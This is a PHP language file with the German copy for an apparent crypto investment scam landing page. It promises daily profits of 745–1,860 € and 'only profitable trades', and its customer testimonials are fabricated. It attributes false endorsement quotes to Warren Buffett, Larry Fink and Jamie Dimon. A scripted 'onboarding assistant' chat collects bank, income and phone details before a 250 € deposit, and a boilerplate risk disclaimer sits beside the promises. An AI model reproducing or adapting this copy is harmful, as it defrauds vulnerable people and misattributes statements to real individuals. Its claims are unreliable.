<?php
require __DIR__ . '/../lang.php';

// ==========================================
// GERMAN (de-DE) OVERRIDE
// Every human-visible string from the root lang.php is translated below.
// Identity/config variables ($site_name, $site_url, $site_domain, $app_price,
// $app_currency, $rating_value, $rating_count, $review_count, $crypto_img,
// stock/crypto ticker symbols, and real public figures' names) are
// intentionally NOT overridden here — they stay inherited from the root file.
// ==========================================
$site_lang = 'de-DE';
$form_language = 'de'; // matches this page's own language, not the offer's global default

$main_h1 = "Täglicher Gewinn von <span>745 €</span> bis <span>1.860 €</span> dank der intelligenten Investmentplattform";
$main_p = "Begrenztes Angebot: Jetzt registrieren — <span>$country_name</span>";

// Testimonial-Namen (weiblich, weiblich, männlich, weiblich, männlich, männlich)
$feedback_strong_1 = "Sophie Wagner";
$feedback_strong_2 = "Lena Fischer";
$feedback_strong_3 = "Max Hoffmann";
$feedback_strong_4 = "Julia Bauer";
$feedback_strong_5 = "Felix Schneider";
$feedback_strong_6 = "Lukas Zimmermann";

$feedback_description_1 = "Ich hatte noch nie eine Investmentplattform genutzt, aber $source hat mir den Einstieg unglaublich leicht gemacht. Ich hätte nie gedacht, das einmal zu sagen: Die Welt der Investments wirkt oft kompliziert. Aber hier ist es so einfach, Beträge zu verdienen, die ich mir nie hätte vorstellen können!";
$feedback_description_2 = "Genau das habe ich erwartet! Ihr Support und Ihr ertragsstarkes System haben mich vollkommen überzeugt – und das werden sie für immer bleiben! Ich kann es selbst kaum glauben: In nur 30 Tagen habe ich über 15.000 € verdient... Vielen herzlichen Dank!";
$feedback_description_3 = "Ich habe an meinem ersten Tag über 650 Euro verdient, deshalb kann ich mit Sicherheit sagen: Endlich habe ich etwas gefunden, das wirklich funktioniert! Ich bin einfach nur dankbar.";
$feedback_description_4 = "Ich möchte mich einfach bedanken, denn $source hat mein Leben wirklich verändert. Ich konnte meinen Job innerhalb weniger Wochen aufgeben!";
$feedback_description_5 = "Es funktioniert wirklich! Ich nutze die Plattform erst seit ein paar Wochen und habe bereits mehr verdient, als ich normalerweise in Monaten harter Arbeit verdient hätte. Unglaublich!";
$feedback_description_6 = "Ich wurde vor zwei Wochen entlassen. Ich dachte, das wäre das Ende. Aber jetzt verdiene ich etwa 3.000 Euro pro Woche! Das klingt vielleicht nicht nach viel, aber zum ersten Mal seit langer Zeit habe ich wieder Hoffnung auf eine stabile Zukunft. Vielen herzlichen Dank!";

// T,D MAIN
$page_title_main = "$source — Offizielle Website | Handelsplattform";
$page_description_main = "Entdecken Sie $source, die Handelsplattform mit künstlicher Intelligenz. Automatische Kryptowährungsanalyse, schnelle Registrierung und Verdienstchancen für Nutzer in Deutschland.";

// ==========================================
// CHAT-QUIZ TRANSLATIONS & CONFIGURATION
// ==========================================

$quiz_consultant_name = 'Sophia';
$quiz_consultant_role = 'Onboarding-Assistentin';

$quiz_text_welcome   = "Hallo! Hier ist $quiz_consultant_name, Ihre persönliche Onboarding-Assistentin bei $site_name. Ausgezeichnete Neuigkeiten! Ihr Zugang wurde offiziell vorab genehmigt. Lassen Sie uns jetzt gemeinsam Ihr professionelles Profil einrichten!";
$quiz_text_q1 = "Um die vollständige regulatorische und rechtliche Compliance sicherzustellen, bestätigen Sie bitte Ihr aktuelles Wohnsitzland: $country_name";
$quiz_text_a1_yes    = "Ja, das ist mein aktueller Wohnsitz";
$quiz_text_a1_no     = "Nein";

$quiz_text_q2 = "Perfekt. Bitte wählen Sie die passende Altersgruppe aus, um die am besten geeigneten Finanzinstrumente zu ermitteln:";

$quiz_text_q3        = "Verfügen Sie über ein aktives Bankkonto oder eine Kreditkarte, um regelmäßige tägliche Dividendenzahlungen zu erhalten?";
$quiz_text_a3_yes    = "Ja, ein aktives Konto ist vorhanden";
$quiz_text_a3_no     = "Noch nicht vorhanden";

$quiz_text_q4        = "Bitte geben Sie Ihre primäre Einkommensquelle an. (Dieser Parameter hilft, die Risikomanagement-Einstellungen des Systems individuell anzupassen.)";
$quiz_text_a4_1      = "Festanstellung / Selbstständigkeit";
$quiz_text_a4_2      = "Passives Einkommen / Persönliche Ersparnisse";
$quiz_text_a4_3      = "Andere Quellen";

$quiz_text_q5 = "Großartig! Der letzte Schritt ist eine kurze telefonische Verifizierung durch unseren Berater zur Bestätigung Ihrer Registrierung. Die Anrufe erfolgen zwischen 11:00 und 20:00 Uhr. Können Sie den Anruf entgegennehmen?";
$quiz_text_a5_yes    = "Ja, diese Zeit ist für den Anruf passend";
$quiz_text_a5_no     = "Bitte den Anruf sofort veranlassen";

$quiz_text_loader    = "Angeforderte Optionen werden analysiert und die sicheren Kontokonfigurationsparameter werden initialisiert...";
$quiz_text_final_ttl = "Konto erfolgreich autorisiert! 🎉 Ihr sicherer digitaler Arbeitsbereich ist vollständig eingerichtet. Bitte schließen Sie die folgenden abschließenden Verifizierungsschritte ab, um tägliche Auszahlungen zu gewährleisten:";

$quiz_placeholder_fname = "Vorname";
$quiz_placeholder_lname = "Nachname";
$quiz_placeholder_email = "E-Mail-Adresse";
$quiz_placeholder_phone = "Telefonnummer";
$quiz_btn_submit = "Handel aktivieren";
$quiz_text_typing       = "schreibt gerade eine Nachricht...";
$quiz_text_processing   = "Anfrage wird bearbeitet...";

// T,D ABOUT
$page_title_about = "Über uns | $source – Sichere und transparente Investmentplattform";
$page_description_about = "Lernen Sie $source kennen: eine automatisierte und sichere Investmentplattform. Fortschrittliche Technologie, kompetenter Support und Transparenz für Einsteiger und erfahrene Trader.";

// T,D CONDITIONS
$page_title_conditions = "$source – Nutzungsbedingungen der Plattform";
$page_description_conditions = "Erfahren Sie mehr über die Allgemeinen Geschäftsbedingungen von $source. Sichere Plattformnutzung, Anlageverantwortung, Datenschutz und geltende Vorschriften.";

// T,D CONTACT
$page_title_contact = "$source – Zuverlässiger Support und schnelle Hilfe";
$page_description_contact = "Benötigen Sie Hilfe mit $source? Unser Support-Team unterstützt Sie bei allen Fragen zu Ihrem Konto, Zahlungen oder der Plattform. Schnelle Antworten und professionelle Unterstützung in Deutschland.";

// T,D PRIVATE
$page_title_private = "Datenschutzerklärung | $source";
$page_description_private = "Erfahren Sie, wie $source Ihre personenbezogenen Daten erhebt, verwendet und schützt. Informationen zur Datenverarbeitung, Sicherheit, den Rechten der Nutzer und zur Einhaltung der DSGVO.";

// T,D REGISTER
$page_title_register = "$source – Intelligente KI-Handelsplattform | Schnelle Registrierung";
$page_description_register = "Starten Sie mit <?= $source ?> in nur wenigen Minuten. Eine intelligente Plattform mit KI-Technologie für effizientes Trading. Schnelle Registrierung, einfacher Zugang und fortschrittliche Tools für Anleger.";


// форма
$contact_form_fname = "Ihr Vorname";
$contact_form_lname = "Ihr Nachname";
$contact_form_email = "E-Mail";
$contact_form_submit = "Jetzt registrieren";


// header
$nav_investors = "Investoren";
$nav_steps = "Ablauf";
$nav_trade = "Handel";
$nav_advantages = "Vorteile";
$nav_statistics = "Statistiken";
$nav_feedback = "Feedback";
$button_register = "Jetzt registrieren";


// footer
$button_register = "Jetzt registrieren";
$footer_about = "Über uns";
$footer_contact = "Kontakt";
$footer_registration = "Registrierung";
$footer_terms = "AGB";
$footer_privacy = "Datenschutz";
$footer_rights = "$source – alle Rechte vorbehalten";

// main
$leaders_badge = "Investoren";
$leaders_title = "Das sind einige der Investoren, die uns unterstützen:";
$leader1_text = "Als Investor habe ich immer daran geglaubt, dass finanzielle Unabhängigkeit die Grundlage persönlicher Freiheit ist. Aus diesem Grund wurde diese auf künstlicher Intelligenz basierende Plattform geschaffen, um Investieren einfacher und zugänglicher zu machen. Meine Vision ist es, jedem klare und wirksame Werkzeuge an die Hand zu geben, um fundierte Entscheidungen zu treffen und mit Sicherheit die eigene finanzielle Stabilität aufzubauen.";
$leader1_name = "— Warren Buffett";
$leader1_position = "Einer der erfolgreichsten Investoren der Geschichte";
$leader2_text = "Die Finanzwelt verändert sich rasant, und Technologie spielt in diesem Wandel eine Schlüsselrolle. Ich glaube, dass die Verbindung von Investmenterfahrung und künstlicher Intelligenz neue Chancen schafft. Diese Plattform wurde entwickelt, um Investieren zugänglicher und transparenter zu machen und Menschen dabei zu helfen, fundierte Entscheidungen zu treffen und langfristige finanzielle Stabilität aufzubauen.";
$leader2_name = "— Larry Fink";
$leader2_position = "CEO von BlackRock — dem weltweit größten Vermögensverwalter";
$leader3_text = "Nach vielen Jahren im globalen Bankensystem habe ich gesehen, wie Technologie die Art und Weise verändern kann, wie Menschen mit ihrem Geld umgehen. Diese Plattform nutzt künstliche Intelligenz, um Investieren klarer und zugänglicher zu machen und Nutzern zu helfen, fundierte finanzielle Entscheidungen zu treffen. Wenn Innovation und Verantwortungsbewusstsein zusammenkommen, entstehen echte Chancen für Wachstum und finanzielle Stabilität.";
$leader3_name = "— Jamie Dimon";
$leader3_position = "CEO von JPMorgan Chase — einer der größten Banken der Welt";


$steps_badge = "Ablauf";
$steps_title = "Ihr Neuanfang beginnt mit drei einfachen Schritten";
$step1_number = "Schritt 1";
$step1_title = "Registrierung";
$step1_text = "Geben Sie Ihre Daten ein und erhalten Sie einen kostenlosen Anruf von einem Plattformberater, um Ihr Konto zu aktivieren";
$step2_number = "Schritt 2";
$step2_title = "Investieren";
$step2_text = "Zahlen Sie mindestens 250–270 Euro auf Ihr Konto ein";
$step3_number = "Schritt 3";
$step3_title = "Beginnen Sie zu verdienen";
$step3_text = "Erhalten Sie Ihre ersten Auszahlungen noch am Tag der Registrierung! Die Plattform schützt Ihr Kapital und Ihre persönlichen Daten.";
$steps_button = "Jetzt registrieren";


$trades_badge = "Geschäfte & Gewinn";
$trades_title = "$source nutzt künstliche Intelligenz und moderne Algorithmen, um ausschließlich profitable Trades zu identifizieren";
$trade_btc_name = "BTC";
$trade_btc_value = "+ 9.071,50 €";
$trade_eth_name = "ETH";
$trade_eth_value = "+ 1.156,57 €";
$trade_ltc_name = "LTC";
$trade_ltc_value = "+ 90,04 €";
$trade_eos_name = "EOS";
$trade_eos_value = "+ 14,01 €";
$trade_xrp_name = "XRP";
$trade_xrp_value = "+ 0,60 €";


$advantages_badge = "Vorteile";
$advantages_title = "Registrieren Sie sich noch heute und erhalten Sie sofortigen Zugang zu diesem revolutionären Handelssystem!";
$advantages_card_badge = "Vorteile";
$adv1_title = "Einfach zu bedienen";
$adv1_text = "$source lässt sich in wenigen Sekunden auf jedem Smartphone oder Computer installieren";
$adv2_title = "Zuverlässiger Betrieb";
$adv2_text = "Vollautomatisierte Prozesse analysieren alle wichtigen Börsen in Echtzeit und ermöglichen maximale Gewinne";
$adv3_title = "Sicher und diskret";
$adv3_text = "Die Blockchain-Technologie garantiert allen Teilnehmern eine Erfolgsquote von 96,9 % bei höchster Datensicherheit";


$statistics_badge = "Statistiken";
$statistics_title = "Zahlen, die für sich sprechen";
$statistics_description_top = "Transparenz ist unser Gründungsprinzip. Die täglichen Einnahmen der Plattform und das stetig wachsende Investitionsvolumen bestätigen die Stabilität und Zuverlässigkeit unseres Projekts. Unsere geheime Aktienhandelsstrategie basiert auf einem sorgfältig ausgewählten Portfolio, das durch die Analyse tausender führender Unternehmen entstanden ist";
$stat1_value = "1,45 €";
$stat1_denomination = "Millionen";
$stat1_title = "Aktuelle Investitionen";
$stat2_value = "0,87 €";
$stat2_denomination = "Millionen";
$stat2_title = "Gesamteinnahmen";
$stat3_value = "0,29 €";
$stat3_denomination = "Milliarden";
$stat3_title = "Plattformeinnahmen";
$statistics_description_bottom = "Unser Team professioneller Analysten sorgt für präzise Ergebnisse bei minimalem Risiko. $source bietet allen Partnern eine stabile und hochprofitable Verdienstmöglichkeit";
$feedback = "Feedback";
$recommendations = "Empfehlungen unserer treuesten Kunden";


$join_title_main = "Gestalten Sie Ihre Zukunft";
$join_title_accent = "– noch heute.";

$places_title = "Täglicher Gewinn von <span style=\"white-space: nowrap\" data-js-deposit-multiply-round=\"3.1\">745 €</span> bis <span style=\"white-space: nowrap\" data-js-deposit-multiply-round=\"7\">1.860 €</span> dank der intelligenten Investmentplattform";
$places_remaining_text = "Verbleibende Plätze";
$places_button = "Jetzt registrieren";


// about page
$about_title = "ÜBER UNS";
$about_paragraph_1 = "$source wurde mit dem Ziel entwickelt, jedem Anleger – vom Einsteiger bis zum erfahrenen Trader – ein sicheres, modernes und transparentes Umfeld für automatisiertes Investieren an Finanz- und Kryptomärkten zu bieten. Wir glauben, dass nachhaltiger Erfolg auf Klarheit, Offenheit und Vertrauen beruht. Deshalb orientieren sich alle Prozesse – von der Registrierung bis zur Auszahlung – an diesen Grundsätzen. Entscheidungen basieren auf Daten und sollen für die Nutzer nachvollziehbar sein.";
$about_paragraph_2 = "Unser Team vereint Kompetenzen aus verschiedenen Bereichen: Entwicklung von KI-Systemen und Algorithmen, Finanzanalyse, Cybersicherheit und Compliance. Wir testen und verbessern kontinuierlich Prozesse und Komponenten – von der Datenqualität über die Systemstabilität bis zur Signalanalyse. Ziel ist eine Plattform, die in der Praxis zuverlässig funktioniert.";
$about_paragraph_3 = "Der Schutz Ihrer persönlichen Daten und Ihres Kapitals hat höchste Priorität. $source orientiert sich an anerkannten Sicherheitsstandards und setzt moderne Verschlüsselung ein. Regelmäßige Sicherheitsprüfungen und technische Kontrollen tragen dazu bei, Informationen und Zugänge zuverlässig zu schützen.";
$about_paragraph_4 = "Technologie ist wichtig, aber auch Orientierung und Unterstützung spielen eine zentrale Rolle. Deshalb bieten wir persönliche Betreuung an, um Funktionen zu erklären, Ziele zu klären und die Nutzung der Plattform zu erleichtern. Sie erhalten Hilfe von echten Menschen, nicht nur automatisierte Antworten.";
$about_paragraph_5 = "Für uns bedeutet Innovation kontinuierliche Verbesserung. Wir analysieren neue Marktmuster, optimieren Modelle und erweitern Datenquellen, um Effizienz und Nutzererlebnis zu verbessern. Aktualisierungen werden anhand historischer Daten und in kontrollierten Tests geprüft, bevor sie veröffentlicht werden.";
$about_paragraph_6 = "Viele Nutzer verwenden $source als strukturierten Einstieg in das automatisierte Investieren. Sie beginnen häufig mit geringem Kapital und einem vorsichtigen Ansatz und erweitern ihre Nutzung Schritt für Schritt, begleitet von klaren Prozessen und Unterstützung.";
$about_paragraph_7 = "Kurz gesagt: $source ist mehr als nur eine Plattform. Es ist ein System, das Technologie, Risikobewusstsein und Unterstützung vereint. Unser Ziel ist es, Ihnen Werkzeuge an die Hand zu geben, um strukturiert und verantwortungsbewusst zu handeln, mit einer transparenten Grundlage für Ihre Entscheidungen.";


// contact
$contact_title = "KONTAKT";
$contact_paragraph_1 = "Unser Support-Team hilft Ihnen zuverlässig und kompetent bei allen Fragen rund um $source. Egal, ob Sie sich nur informieren, bereits registriert sind oder die Plattform bereits aktiv nutzen – wir helfen Ihnen, schnell voranzukommen.";
$contact_subtitle = "So erreichen Sie uns";
$contact_paragraph_2 = "Wir unterstützen Sie gezielt bei allen Themen rund um Ihr Konto und die Nutzung von $source. Unser Team ist von Montag bis Freitag zu den üblichen Geschäftszeiten (MEZ) erreichbar und bearbeitet Anfragen mit hoher Priorität. Typische Bereiche, bei denen wir helfen:";
$contact_list = [
    "Erstellung und Verifizierung Ihres Kontos sowie Kontoverwaltung (inklusive Profil- und Risikoeinstellungen)",
    "Technische Hilfe für die Plattform, die App oder bei Fehlern",
    "Fragen zu Einzahlungen und Auszahlungen, Bearbeitungszeiten und akzeptierten Zahlungsmethoden",
    "Informationen zu Funktionen, Strategien, KI-Logik und verfügbaren Instrumenten",
    "Feedback, Ideen und Verbesserungsvorschläge für die Weiterentwicklung",
    "Unterstützung bei weiteren Anliegen, von allgemeinen bis hin zu individuellen Fragen"
];
$contact_paragraph_3 = "Nutzen Sie das sichere Kontaktformular unten und füllen Sie alle relevanten Felder aus, damit wir Ihre Anfrage schnell bearbeiten können. In der Regel erhalten Sie an Werktagen innerhalb von 24 Stunden eine Antwort, oft schneller. Für dringende technische Anliegen steht Ihnen werktags von 9 bis 18 Uhr ein Live-Chat zur Verfügung.";


// sign-up page
$home_title = "STARTEN SIE MIT <span style=\"text-transform: uppercase\">$source</span> – EINSATZBEREIT IN NUR WENIGEN MINUTEN.";


// conditions page
$terms_title = "NUTZUNGSBEDINGUNGEN";
$terms_1 = "Diese Bedingungen regeln die Nutzung der Plattform und sind für alle registrierten Nutzer verbindlich. Mit der Registrierung oder Nutzung erklären Sie sich mit diesen Bedingungen einverstanden. Die Nutzung ist ausschließlich volljährigen und geschäftsfähigen Personen vorbehalten.";

$terms_2 = "Die Plattform kann durch technische Wartung oder äußere Umstände vorübergehend eingeschränkt sein. Funktionen, Inhalte oder Angebote können angepasst oder weiterentwickelt werden.";

$terms_3 = "Alle bereitgestellten Inhalte, Technologien und Analysen sind gesetzlich geschützt. Eine Nutzung außerhalb der Plattform ist ohne Genehmigung nicht gestattet.";

$terms_4 = "Nutzer müssen korrekte und aktuelle Daten angeben. Investitions- und Handelsentscheidungen liegen in der eigenen Verantwortung. Es handelt sich nicht um eine Finanzberatung oder eine Garantie für bestimmte Ergebnisse. Finanzmärkte bergen Risiken, einschließlich des möglichen Verlusts des eingesetzten Kapitals.";

$terms_5 = "Personenbezogene Daten werden gemäß den geltenden Datenschutzbestimmungen verarbeitet. Es gelten angemessene Sicherheits- und Compliance-Standards.";

$terms_6 = "Wir behalten uns das Recht vor, die Nutzungsbedingungen zu ändern. Die fortgesetzte Nutzung der Plattform gilt als Zustimmung zu den aktualisierten Regeln.";


// private page
$privacy_title = "DATENSCHUTZERKLÄRUNG";

$privacy_1 = "Der Schutz Ihrer personenbezogenen Daten hat für uns höchste Priorität. Wir verarbeiten Ihre Daten ausschließlich gemäß den geltenden Datenschutzbestimmungen, insbesondere der DSGVO.";

$privacy_2 = "Wir erheben nur die Informationen, die zur Erbringung unserer Dienstleistungen erforderlich sind – wie Kontakt-, Konto-, Transaktions- und technische Nutzungsdaten. In bestimmten Fällen kann eine Identitätsprüfung gesetzlich vorgeschrieben sein.";

$privacy_3 = "Die Datenverarbeitung erfolgt zur Kontoverwaltung, Durchführung von Transaktionen, Kundenbetreuung, Sicherheit, Betrugsprävention und Erfüllung gesetzlicher Pflichten. Marketinginformationen erhalten Sie nur mit Ihrer ausdrücklichen Einwilligung.";

$privacy_4 = "Die Weitergabe von Daten erfolgt ausschließlich an sorgfältig ausgewählte Dienstleister (z. B. Zahlungs- oder IT-Anbieter) und nur im erforderlichen Umfang. Ihre Daten werden nicht verkauft.";

$privacy_5 = "Wir setzen geeignete technische und organisatorische Sicherheitsmaßnahmen ein. Daten werden nur so lange gespeichert, wie es gesetzlich vorgeschrieben oder für den jeweiligen Zweck erforderlich ist.";

$privacy_6 = "Sie haben jederzeit das Recht auf Auskunft, Berichtigung, Löschung oder Einschränkung der Verarbeitung Ihrer Daten sowie auf Widerruf erteilter Einwilligungen.";

$privacy_google_choices = 'Sie können verwalten, wie Google Informationen über Ihre Besuche nutzt, über die <a href="http://www.google.com/settings/ads" target="_blank" rel="noopener">Google Ads-Einstellungen</a>, sich über das <a href="https://tools.google.com/dlpage/gaoptout" target="_blank" rel="noopener">Browser-Add-on zur Deaktivierung von Google Analytics</a> von interessenbezogener Werbung abmelden, oder in der <a href="https://www.google.com/intl/de/policies/privacy/" target="_blank" rel="noopener">Datenschutzerklärung von Google</a> weitere Informationen nachlesen.';

$privacy_7 = "Weitere Informationen und Kontaktmöglichkeiten finden Sie auf unserer Website.";

// ==========================================
// CALCULATOR SECTION
// ==========================================
$calc_badge = "Rechner";
$calc_title = "Berechnen Sie Ihre potenzielle Rendite mit $source";
$calc_amount_label = "Anlagebetrag";
$calc_term_label = "Anlagedauer";
$calc_profit_label = "Geschätzter Gewinn";
$calc_total_label = "Voraussichtliche Gesamtrendite";
$calc_btn = "Jetzt registrieren";

// ==========================================
// SECURITY SECTION
// ==========================================
$security_badge = "Sicherheit zuerst";
$security_title = "Sicherheit auf institutionellem Niveau für Ihr Kapital und Ihre Daten";

$security_card1_title = "AES-256-Protokollverschlüsselung";
$security_card1_desc = "Alle Datenströme und Anmeldedaten der Nutzer werden mit militärtauglichen SSL/TLS-Protokollen und dem AES-256-Standard verschlüsselt, um unbefugtes Abfangen zu verhindern.";

$security_card2_title = "Getrennte Liquiditätskonten";
$security_card2_desc = "Nutzergelder werden strikt von den operativen Vermögenswerten des Unternehmens getrennt und direkt in regulierten Tier-1-Liquiditätspools und Partnerbörsen verwahrt.";

$security_card3_title = "Nur-Lese-API-Integration";
$security_card3_desc = "Die automatisierte Ausführung erfolgt ausschließlich über verschlüsselte API-Schlüssel ohne jegliche Auszahlungsberechtigung. Ihre Vermögenswerte können Ihr Börsen-Wallet niemals verlassen.";

$security_card4_title = "Automatisierte Risikoschutzmechanismen";
$security_card4_desc = "Fest eingebaute Stop-Loss-Grenzen und ein Slippage-Schutz stoppen die Ausführung sofort bei anomaler Marktvolatilität, um die Kontointegrität zu wahren.";

// ==========================================
// SEO-TEXT SECTION
// ==========================================
$seo_badge = "Überblick";
$seo_title = "Automatisierte Handelstechnologie für moderne Finanzmärkte";

$seo_p1 = "Der Handel mit digitalen Vermögenswerten erfordert Geschwindigkeit, Präzision und zuverlässige Datenverarbeitung. <strong>$source</strong> bietet eine fortschrittliche automatisierte Handelsinfrastruktur, die entwickelt wurde, um emotionale Verzerrungen auszuschließen, die Ausführungslatenz zu verringern und Marktchancen rund um die Uhr systematisch zu analysieren.";

$seo_image_alt = "Algorithmische Handels-Engine analysiert Börsendaten und generiert ein risikokontrolliertes Handelssignal";

$seo_feature1_title = "Algorithmische Präzision";
$seo_feature1_desc = "Führt Trades auf Basis statistischer Wahrscheinlichkeiten und Echtzeit-Marktindikatoren aus.";
$seo_feature2_title = "Institutionelle Sicherheit";
$seo_feature2_desc = "Verschlüsselte Datenprotokolle und strikter API-Schlüsselschutz für die Sicherheit Ihres Kontos.";
$seo_feature3_title = "Echtzeit-Analysen";
$seo_feature3_desc = "Kontinuierliche Überwachung von Liquiditätspools, Orderbüchern und Preisbewegungen.";

$seo_subheading1 = "So funktioniert die algorithmische Engine";
$seo_p2 = "Die Plattform analysiert komplexe Orderbuchdaten der wichtigsten globalen Börsen. Durch kontinuierliches Liquiditäts-Scanning und trendfolgende Algorithmen erkennt <strong>$source</strong> Preisineffizienzen, bevor manuelle Trader reagieren können.";
$seo_p3 = "Anstatt auf Vermutungen zu setzen, nutzen Nutzer strukturierte Risikomanagement-Parameter, die Gewinnziele dynamisch berechnen und das Risiko begrenzen. Dieser Ansatz schafft eine ausgewogene Handelsstrategie, die sowohl für volatile Marktbedingungen als auch für gewöhnliche Trendzyklen geeignet ist.";

$seo_subheading2 = "Wichtige Systemfunktionen";
$seo_list1_strong = "Automatisierte Orderausführung:";
$seo_list1_text = "Eliminiert Verzögerungen zwischen Einstiegssignalen und der Ausführung des Trades.";
$seo_list2_strong = "Anpassbare Risikoparameter:";
$seo_list2_text = "Legen Sie vordefinierte Stop-Loss-Level und tägliche Risikogrenzen fest, die auf Ihre individuellen Ziele zugeschnitten sind.";
$seo_list3_strong = "Nahtlose Integration:";
$seo_list3_text = "Verbinden Sie sich direkt mit verifizierten Brokern und Börsen über sichere Nur-Lese-API-Schnittstellen.";

$seo_p4 = "Der Einstieg erfordert nur minimalen technischen Aufwand. Durch die Kombination von Marktzugang auf institutionellem Niveau mit einer intuitiven Oberfläche bietet <strong>$source</strong> einen optimierten Weg zu strukturierter Handelsautomatisierung.";

// ==========================================
// FAQ SECTION (calculator/security block FAQ — distinct from any other FAQ on the page)
// ==========================================
$calc_faq_badge = "FAQ";
$calc_faq_title = "Häufig gestellte Fragen";

$calc_faq_q1 = "Ist die Nutzung von $source sicher und zuverlässig?";
$calc_faq_a1 = "Ja. <strong>$source</strong> arbeitet mit verschlüsselten API-Protokollen, die ausschließlich Lese- und Ausführungsrechte besitzen. Das System hat niemals direkten Zugriff, um Ihre Gelder abzuheben, und alle aktiven Handelsguthaben bleiben sicher in Ihrem verbundenen Broker- oder Börsenkonto.";

$calc_faq_q2 = "Wie funktionieren die automatisierten Handelsalgorithmen?";
$calc_faq_a2 = "Die Plattform durchsucht kontinuierlich Orderbücher und Marktliquidität der wichtigsten globalen Börsen. Wenn mathematische Indikatoren eine Preisbewegung mit hoher Wahrscheinlichkeit anzeigen, löst das System automatisch innerhalb von Millisekunden Mikro-Orders aus – ganz ohne menschliche Verzögerung oder emotionale Entscheidungen.";

$calc_faq_q3 = "Wie hoch ist die erforderliche Mindesteinzahlung?";
$calc_faq_a3 = "Das für den Start des aktiven Handels erforderliche Mindestkapital beträgt <strong>$app_price $app_currency</strong>. Diese Einstiegsschwelle stellt sicher, dass der Algorithmus über ausreichend Liquidität verfügt, um Positionsgrößen korrekt aufzuteilen und automatisierte Risikomanagement-Regeln anzuwenden.";

$calc_faq_q4 = "Benötige ich Vorerfahrung im Handel, um zu starten?";
$calc_faq_a4 = "Es ist keine vorherige Finanzerfahrung erforderlich. <strong>$source</strong> ist vollständig automatisiert und übernimmt nach einer kurzen Erstkonfiguration die Marktausführung, Risikoberechnung und Orderverfolgung für Sie.";

$calc_faq_q5 = "Gibt es versteckte Gebühren oder Abonnementkosten?";
$calc_faq_a5 = "Es fallen keine versteckten monatlichen Abonnementgebühren für die Nutzung der Kernhandelsoberfläche an. Die Registrierung ist kostenlos, und 100 % Ihrer eingezahlten Gelder fließen direkt in Ihr Handelskapital.";

// ==========================================
// RISK WARNING PAGE
// ==========================================
$page_title_risk_warning = "Risikohinweis | $source";
$page_description_risk_warning = "Erfahren Sie mehr über die Risiken des automatisierten Krypto-Handels mit $source, einschließlich Marktvolatilität, Ausführungsrisiko und regulatorischer Aspekte.";
$risk_warning_title = "Risikohinweis";
$risk_warning_intro = "Das Verständnis von Risiken ist der erste Schritt zu selbstbewusstem Handeln.";

$risk_warning_ai_heading = "So hilft unser KI-System beim Risikomanagement:";
$risk_warning_ai_1 = "<strong>Algorithmische Effizienz & emotionsloser Handel:</strong> Fortschrittliche Algorithmen analysieren Marktsignale, um Trades objektiv zum optimalen Zeitpunkt auszuführen.";
$risk_warning_ai_2 = "<strong>Datenbasierte Strategien:</strong> Strategien basieren auf verifizierten Marktmustern und Echtzeitanalysen statt auf Vermutungen.";
$risk_warning_ai_3 = "<strong>Flexible Einstellungen & volle Kontrolle:</strong> Passen Sie Ihre Risikoparameter jederzeit an. Verfolgen Sie alle Guthaben und Trades transparent in Ihrem Dashboard – ohne versteckte Gebühren und mit uneingeschränkten Auszahlungen.";

$risk_warning_disclaimer = "<strong>Haftungsausschluss:</strong> Handel ist stets mit Risiko verbunden. Automatisierte Systeme (einschließlich KI) garantieren keinen Gewinn, können durch Softwarefehler oder unerwartete Marktereignisse versagen und erfordern eine Überwachung durch den Nutzer. Die vergangene Wertentwicklung ist kein Indikator für zukünftige Ergebnisse. Diese Plattform dient ausschließlich Informations- und Marketingzwecken und stellt keine Finanzberatung dar.";

$risk_warning_s1_heading = "1. Allgemeine Risiken und Risiken des Kryptomarktes";
$risk_warning_s1_intro = "Kryptowährungen sind hochvolatile, spekulative Vermögenswerte, die rund um die Uhr mit minimaler regulatorischer Aufsicht in den meisten Rechtsordnungen gehandelt werden.";
$risk_warning_s1_1 = "Werte können innerhalb kurzer Zeiträume drastisch schwanken, was zu einem vollständigen Verlust des investierten Kapitals führen kann.";
$risk_warning_s1_2 = "Marktwerte können erheblich durch regulatorische Änderungen, technische Entwicklungen, Sicherheitsverletzungen oder umfassendere makroökonomische Ereignisse beeinflusst werden.";
$risk_warning_s1_3 = "Einige Vermögenswerte können vollständig an Wert verlieren. Investieren Sie nur Geld, dessen Verlust Sie sich leisten können.";

$risk_warning_s2_heading = "2. Ausführungs-, Liquiditäts- und Hebelrisiken";
$risk_warning_s2_1 = "<strong>Marktvolatilität & Liquidität:</strong> Extreme Preisbewegungen (10–20 % oder mehr pro Tag) oder geringe Liquidität (insbesondere bei kleineren Coins) können zu Verzögerungen, Plattformausfällen und erheblichem Ausführungs-Slippage führen. Stop-Loss-Orders können unter extremen Bedingungen keine Verlustgrenzen garantieren.";
$risk_warning_s2_2 = "<strong>Hebel- und Margin-Risiken:</strong> Gehebelte Produkte verstärken sowohl Gewinne als auch Verluste, sodass Sie mehr verlieren können als Ihre ursprüngliche Einzahlung. Etwa 70–80 % der Kleinanlegerkonten verlieren beim Handel mit gehebelten Produkten Geld.";

$risk_warning_s3_heading = "3. Technische Risiken, Cybersicherheits- und Drittanbieterrisiken";
$risk_warning_s3_1 = "<strong>Technische Faktoren:</strong> Online-Handel birgt grundsätzlich Risiken durch Internetausfälle, Hardware-/Softwarefehler und Nichtverfügbarkeit von Diensten.";
$risk_warning_s3_2 = "<strong>Cybersicherheit:</strong> Kryptowährungskonten sind häufige Ziele von Phishing, Malware und Hackerangriffen. Transaktionen sind unwiderruflich; die Kompromittierung Ihrer Zugangsdaten kann zu einem dauerhaften Verlust führen.";
$risk_warning_s3_3 = "<strong>Drittanbieter-Plattformen:</strong> Diese Website kann Nutzer mit Plattformen von Drittanbietern verbinden. Wir kontrollieren, befürworten oder garantieren weder deren Sicherheit noch deren Betrieb oder Zahlungsfähigkeit. Führen Sie stets Ihre eigene Sorgfaltsprüfung durch, bevor Sie Gelder auf externen Plattformen einzahlen.";

$risk_warning_s4_heading = "4. Regulatorische Bestimmungen, Steuern und Schlussbestimmungen";
$risk_warning_s4_1 = "<strong>Rechtliche Compliance & Steuern:</strong> Regulatorische Rahmenbedingungen unterscheiden sich stark und ändern sich schnell. Nutzer sind allein dafür verantwortlich sicherzustellen, dass ihre Handelsaktivitäten den örtlichen Gesetzen entsprechen, und ihre eigenen steuerlichen Pflichten zu erfüllen.";
$risk_warning_s4_2 = "<strong>Keine Gewinngarantien:</strong> Es gibt keinen \"sicheren\" oder risikofreien Krypto-Handel. Alle Renditeangaben oder Performance-Beispiele sind rein hypothetisch.";
